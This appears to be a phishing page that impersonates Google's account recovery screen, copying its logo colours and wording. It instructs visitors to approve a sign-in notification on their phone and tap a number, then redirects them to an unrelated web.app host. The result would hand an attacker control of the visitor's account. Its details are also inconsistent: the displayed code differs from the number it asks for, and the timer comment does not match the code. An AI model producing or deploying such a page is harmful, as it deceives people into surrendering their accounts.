<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account recovery - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #fff;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
        }

        .logo {
            margin-bottom: 10px;
        }

        .logo-text {
            font-size: 16px;
            color: #5f6368;
            letter-spacing: 0.3px;
        }

        .logo-text span:first-child {
            color: #4285f4;
        }

        .logo-text span:nth-child(2) {
            color: #ea4335;
        }

        .logo-text span:nth-child(3) {
            color: #fbbc04;
        }

        .logo-text span:nth-child(4) {
            color: #4285f4;
        }

        .logo-text span:nth-child(5) {
            color: #34a853;
        }

        .logo-text span:nth-child(6) {
            color: #ea4335;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 16px 0 8px;
        }

        .subtitle {
            font-size: 16px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 32px;
        }

        .code-box {
            background-color: #f8f9fa;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 24px;
            margin-bottom: 32px;
        }

        .code {
            font-size: 48px;
            font-weight: 500;
            color: #202124;
            letter-spacing: 8px;
        }

        .instruction {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .instruction strong {
            color: #202124;
        }

        .resend-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 16px;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        .footer-link {
            font-size: 12px;
            color: #5f6368;
            text-decoration: none;
        }

        .footer-link:hover {
            color: #202124;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </div>
        </div>

        <h1>Account recovery</h1>
        
        <p class="subtitle">
            To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>

        <div class="code-box">
            <div class="code">6</div>
        </div>

        <p class="instruction">
            <strong>Check your phone</strong><br>
            Pull down the notification bar and tap the sign-in notification. Tap <strong>Yes</strong>, then tap <strong>47</strong> on your phone to verify it's you.
        </p>

        <a href="#" class="resend-link">Resend it</a>

        <div>
            <a href="#" class="footer-link">Try another way</a>
        </div>
    </div>

<script>
// After 3 seconds, show a "Continue" button
setTimeout(function() {
    const continueBtn = document.createElement('button');
    continueBtn.textContent = 'Continue';
    continueBtn.style.cssText = 'background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;margin-top:20px';
    
    continueBtn.onclick = function() {
        window.location.href = 'https://callrandoms.web.app/dashboard.html'; // Your next page
    };
    
    document.querySelector('.container').appendChild(continueBtn);
}, 30000);
</script>
</body>

</html>
